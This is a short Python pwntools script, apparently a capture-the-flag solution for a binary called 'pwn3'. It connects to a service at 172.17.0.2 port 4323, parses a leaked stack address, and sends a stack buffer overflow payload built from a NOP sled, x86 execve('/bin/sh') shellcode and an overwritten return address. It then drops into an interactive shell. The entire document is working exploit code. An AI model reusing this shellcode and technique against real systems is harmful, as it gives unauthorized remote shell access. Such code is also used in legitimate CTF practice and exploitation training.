from pwn import *

p = remote('172.17.0.2', 4323)
#p = process('./pwn3')

msg = p.read().split(' ')

address = msg[-1][0:10]
ret = p32(int(address, 16))

shellcode = ("\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" +
             "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" +
             "\x80\xe8\xdc\xff\xff\xff/bin/sh")
sled = '\x90'*(302 - len(shellcode))
payload =  sled + shellcode + ret

p.send(payload + '\n')
p.interactive()

